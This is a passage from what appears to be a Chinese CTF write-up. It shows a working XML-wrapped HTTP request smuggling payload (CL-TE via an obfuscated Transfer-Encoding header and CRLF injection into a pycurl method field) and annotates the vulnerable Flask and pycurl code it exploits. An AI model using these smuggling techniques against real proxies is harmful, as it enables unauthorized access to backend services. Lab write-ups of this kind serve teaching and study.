- 最终载荷，HTTP 请求走私 —— CL-TE 走私隧道。内容已归档到各主题，仅简要描述

    ```xml
    settings=<@urlencode>
    <settings>

    <body>
    <icon_url>http://bubulle-corp-internal-proxy</icon_url>
    <method>HEAd / HTTP/1.1
    Host: x
    SCRIPT_NAME: /
    Transfer-Encoding&#133;: chunked
    Content-Length: 57
    Connection&#160;: keep-alive

    0<@html_entities>

    GET /flag HTTP/1.1
    Host: localhost

    </@html_entities></method>
    </body>

    <icon_url>https://just_pass_https_check/</icon_url>
    <method>GET</method>

    </settings>
    </@urlencode>
    ```
    - 之前探测到，普通回车换行将成功注入而作为“前端”发送的走私请求。继续探测以及查看规范：
        1. XML 解析器在处理之前，即把所有回车换行组合规范化为换行符。而实际测试时将之前的`\r\n`，修改为单个`\r`或`\n`均成功。此处的 XML 解析器符合规范
        2. apache 的严格模式放宽，导致不完整的回车换行将被成功解析
        - 结合1/2两条，导致此处无论输入 URL 编码的 `\r\n` `\r` `\n` 均可被 apache 成功解析 
        - 而 HTML 编码的被走私回车换行序列、以及头部混淆的空白符则不会被规范化，而得以保留并被 Unicode 编码后保存。载荷从代理发送到并未放宽格式的后端 gunicorn 时维持有效格式

    - `Transfer-Encoding&#133;: chunked`
        - apache 作为普通头部，而不会应用 CL/TE 头部移除
        - gunicorn 去掉头部名的特异空白符，识别为 TE
        - 组件解析差异导致 CL-TE 请求走私

    - `HEAd` 
        - 由于前端服务器 gunicorn 的 HTTP 动词分支判断使用有缺陷的正则表达式，仅检查连续3个字符是否满足。
        - 中间代理服务器 apache 直接转发 HTTP 动词

    - `Connection&#160;: keep-alive`
        - HTTP/1.1 隧道走私时需打开连接，此处注入保持连接头部以应对代理服务器配置文件中的 `keepalive=Off`
        - apache 将关闭连接的头部追加的位置在原请求头部之后
        - gunicorn 找到头部则立即返回，于是拿到注入头部

    - `SCRIPT_NAME`
        - gunicorn 设置与路径相同的值时，移除后得到空串。空串根据规范定义得到根目录重定向。以此获取足够获取 flag 的内容长度

    from lxml import etree as ET

    # 设置页面代码
    @bp.route("/settings", methods=["GET", "POST"])
    @login_required
    def settings():
        db = get_db()
        user = db.execute("SELECT * FROM users WHERE id = ?", (session["user_id"],)).fetchone()

        # POST 分支
        if request.method == "POST":
            xml_data = request.form["settings"]

            # 尝试解析请求体参数 settings 的值为 XML 格式
            try:
                root = ET.fromstring(xml_data.encode())
            except ET.XMLSyntaxError:
                # 测试中多次看到的 `Invalid XML` 即为此处解析异常
                return render_template("settings.html", user=user, error="Invalid XML")

            # 查看标签是否为 `settings`
            if root.tag != "settings":
                return render_template("settings.html", user=user, error="Root element must be <settings>")

            # 必然包括 icon_url 与 method 两个标签，且普通探测时将返回缺乏标签的提示
            child_tags = [elem.tag for elem in root]
            if "icon_url" not in child_tags:
                return render_template("settings.html", user=user, error="Missing <icon_url>")
            if "method" not in child_tags:
                return render_template("settings.html", user=user, error="Missing <method>")

            # 浅层遍历 settings 标签
            for elem in list(root):
                # icon_url 标签不得为空，且应当使用 `https://` 前缀开头
                ## 然而嵌套标签并未被检测
                if elem.tag == "icon_url" and (not elem.text or not elem.text.startswith("https://")):
                    # 否则返回测试看到的图标 URL 错误信息
                    return render_template("settings.html", user=user, error="Icon URL must start with https://")

                # method 必为 GET 或 POST
                if elem.tag == "method" and elem.text not in ("GET", "POST"):
                    return render_template("settings.html", user=user, error="Method must be GET or POST")

                # 移除所有非白名单标签
                if elem.tag not in ("icon_url", "method", "body"):
                    root.remove(elem)

            # 此时导出 XML 到字符串，更新 users 表的 settings 列
            clean = ET.tostring(root, encoding="unicode")
            db.execute("UPDATE users SET settings = ? WHERE id = ?", (clean, session["user_id"]))
            db.commit()
            return redirect("/settings")

        return render_template("settings.html", user=user)

    ```py
    import io
    import pycurl
    from lxml import etree as ET

    def fetch_icon(settings_xml):
        # 转字符串为 XML 树
        root = ET.fromstring(settings_xml.encode())
        
        # 在树中的任意位置查找第一个元素，并返回
        ## 检查时遍历浅层，而 body 标签内可嵌套子标签
        icon_url = root.find(".//icon_url").text
        method = root.find(".//method").text
        body = root.find(".//body").text if root.find(".//body") else None

        if icon_url == "DEFAULT":
            return (open("./app/static/blowfish.svg"), "image/svg+xml")

        # 数据作为 pycurl.Curl 的参数
        buffer = io.BytesIO()
        c = pycurl.Curl()
        # icon_url
        c.setopt(pycurl.URL, icon_url.encode("latin1"))
        # method
        c.setopt(pycurl.CUSTOMREQUEST, method.encode("latin1"))
        c.setopt(pycurl.WRITEDATA, buffer)
        c.setopt(pycurl.TIMEOUT, 5)
        c.setopt(pycurl.SSL_VERIFYPEER, 0)
        c.setopt(pycurl.SSL_VERIFYHOST, 0)
        c.setopt(pycurl.PROTOCOLS, pycurl.PROTO_HTTP | pycurl.PROTO_HTTPS)
        c.setopt(pycurl.REDIR_PROTOCOLS, pycurl.PROTO_HTTP | pycurl.PROTO_HTTPS)

        # body
        if body:
            c.setopt(pycurl.POSTFIELDS, body.encode("latin1"))

        c.perform()
        c.close()

        return (buffer.getvalue(), "image/png")

    ```
